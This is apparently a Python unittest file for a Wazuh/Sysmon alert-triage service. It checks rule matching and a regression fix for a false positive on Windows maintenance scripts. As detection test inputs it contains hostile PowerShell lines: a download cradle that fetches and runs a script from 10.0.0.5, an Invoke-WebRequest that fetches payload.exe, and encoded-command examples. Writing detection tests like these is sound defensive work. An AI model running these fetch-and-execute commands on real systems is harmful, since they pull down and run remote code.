import unittest

import server


def alert(
    *,
    command="",
    rule_id="92027",
    level=4,
    event_id="1",
    channel="Microsoft-Windows-Sysmon/Operational",
):
    return {
        "rule": {
            "id": rule_id,
            "level": level,
            "description": "Test alert",
            "groups": ["sysmon"],
            "mitreId": "",
            "mitreTactic": "",
            "mitreTechnique": "",
        },
        "event": {
            "channel": channel,
            "eventId": event_id,
            "provider": "Microsoft-Windows-Sysmon",
            "message": "",
        },
        "process": {
            "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "parentImage": "C:\\Windows\\System32\\cmd.exe",
            "commandLine": command,
            "parentCommandLine": "",
            "currentDirectory": "C:\\Users\\Analyst",
            "user": "WIN11-SOC-ENDPOINT\\Analyst",
        },
    }


class TriageRulePackTests(unittest.TestCase):
    def test_simplify_account_group_change(self):
        hit = {
            "_id": "account-4732",
            "_index": "wazuh-alerts-test",
            "_source": {
                "timestamp": "2026-07-23T07:50:12.013+0000",
                "agent": {
                    "id": "001",
                    "name": "WIN11-SOC-ENDPOINT",
                    "ip": "192.168.64.3",
                },
                "manager": {"name": "wazuh.manager"},
                "rule": {
                    "id": "60154",
                    "level": 12,
                    "description": "Administrators Group Changed",
                    "groups": ["windows", "windows_security", "group_changed"],
                    "mitre": {
                        "id": ["T1484"],
                        "tactic": ["Defense Evasion"],
                        "technique": ["Domain Policy Modification"],
                    },
                },
                "data": {
                    "win": {
                        "system": {
                            "channel": "Security",
                            "eventID": "4732",
                            "providerName": "Microsoft-Windows-Security-Auditing",
                            "message": "A member was added to a security-enabled local group.",
                        },
                        "eventdata": {
                            "subjectUserName": "Shams",
                            "subjectDomainName": "WIN11-SOC-ENDPOINT",
                            "targetUserName": "Administrators",
                            "targetDomainName": "Builtin",
                            "memberName": "soc_lab_temp_admin",
                            "memberSid": "S-1-5-21-test-1003",
                        },
                    }
                },
            },
        }

        result = server.simplify_alert(hit)

        self.assertEqual(result["account"]["action"], "Member added to local security group")
        self.assertEqual(result["account"]["actor"], r"WIN11-SOC-ENDPOINT\Shams")
        self.assertEqual(result["account"]["memberName"], "soc_lab_temp_admin")
        self.assertEqual(result["account"]["groupName"], "Administrators")
        self.assertEqual(result["process"]["user"], r"WIN11-SOC-ENDPOINT\Shams")
        self.assertEqual(result["triage"]["status"], "candidate")
        self.assertEqual(result["triage"]["policyRule"], "SOC-ACCOUNT-002")
        self.assertIn("T1098", result["triage"]["mitre"])

    def test_rule_pack_loads(self):
        rule_pack = server.load_rule_pack()
        self.assertFalse(rule_pack["error"])
        self.assertGreaterEqual(len(rule_pack["rules"]), 10)

    def test_encoded_powershell_is_candidate(self):
        result = server.triage_alert(
            alert(command="powershell.exe -NoProfile -EncodedCommand SQBFAFgA")
        )
        self.assertEqual(result["status"], "candidate")
        self.assertEqual(result["policyRule"], "SOC-PS-002")
        self.assertEqual(result["mitre"], ["T1059.001", "T1027"])
        self.assertIn("-EncodedCommand", result["detection"]["command_line_any"])

    def test_scheduled_task_is_candidate(self):
        result = server.triage_alert(
            alert(command='schtasks.exe /Create /TN "SOC-Lab-Benign-Task"')
        )
        self.assertEqual(result["status"], "candidate")
        self.assertEqual(result["policyRule"], "SOC-PERSIST-001")

    def test_unmatched_low_level_alert_is_review(self):
        result = server.triage_alert(
            alert(command="notepad.exe", rule_id="99999", level=3)
        )
        self.assertEqual(result["status"], "review")
        self.assertNotIn("policyRule", result)

class FalsePositiveTests(unittest.TestCase):
    """Regression tests for the 2026-08-24 false positive.

    Windows automatic maintenance loaded a module that *defines* proxy
    functions named Invoke-Expression and Invoke-Command. The old SOC-PS-003
    matched the bare string "invoke-expression", scored it 98, and put routine
    patching at the top of the investigation queue. Worse, that module exists
    to block Invoke-Expression in scripts, so a defensive control was being
    reported as an attack.
    """

    DEFINITION_SCRIPT = """\"Creating Scriptblock text (1 of 1):
function Test-Caller {
    param([Parameter(Mandatory=$true)][System.Management.Automation.CallStackFrame[]]$CallStack)
    if ($location -eq '<No file>') { throw 'Invoke-Expression cannot be used in a script' }
}
function Invoke-Expression {
    [CmdletBinding(HelpUri='https://go.microsoft.com/fwlink/?LinkID=2097030')]
param([Parameter(Mandatory=$true, Position=0, ValueFromPipeline=$true)][string]${Command})
\""""

    def test_function_definition_is_not_a_candidate(self):
        result = server.triage_alert(
            alert(command=self.DEFINITION_SCRIPT, rule_id="91823", level=14,
                  event_id="4104", channel="Microsoft-Windows-PowerShell/Operational")
        )
        self.assertNotEqual(result["status"], "candidate")
        self.assertNotEqual(result.get("policyRule"), "SOC-PS-003")

    def test_function_definition_stays_visible_for_review(self):
        # Suppressing it entirely would be the opposite mistake: Wazuh rated it
        # level 14, so an analyst must still be able to find it.
        result = server.triage_alert(
            alert(command=self.DEFINITION_SCRIPT, rule_id="91823", level=14,
                  event_id="4104", channel="Microsoft-Windows-PowerShell/Operational")
        )
        self.assertEqual(result["status"], "review")

    def test_real_download_cradle_still_fires(self):
        result = server.triage_alert(
            alert(command="powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/a.ps1')\"")
        )
        self.assertEqual(result["status"], "candidate")
        self.assertEqual(result["policyRule"], "SOC-PS-003")

    def test_invoke_webrequest_still_fires(self):
        result = server.triage_alert(
            alert(command="powershell -c \"Invoke-WebRequest http://10.0.0.5/payload.exe -OutFile p.exe\"")
        )
        self.assertEqual(result["status"], "candidate")
        self.assertEqual(result["policyRule"], "SOC-PS-003")

    def test_bare_iex_is_review_not_candidate(self):
        # Executing a string is a far weaker signal than fetching one.
        # rule_id 99999 keeps this isolated to SOC-PS-005: the default 92027
        # independently matches SOC-WAZUH-001 (candidate, 85), which would
        # legitimately outrank it.
        result = server.triage_alert(
            alert(command="powershell -c \"Invoke-Expression $payload\"", rule_id="99999")
        )
        self.assertEqual(result["status"], "review")
        self.assertEqual(result["policyRule"], "SOC-PS-005")

    def test_wazuh_high_signal_rule_still_outranks_weak_text_match(self):
        # Documents the interaction the test above isolates around.
        result = server.triage_alert(
            alert(command="powershell -c \"Invoke-Expression $payload\"", rule_id="92027")
        )
        self.assertEqual(result["status"], "candidate")
        self.assertEqual(result["policyRule"], "SOC-WAZUH-001")


if __name__ == "__main__":
    unittest.main()
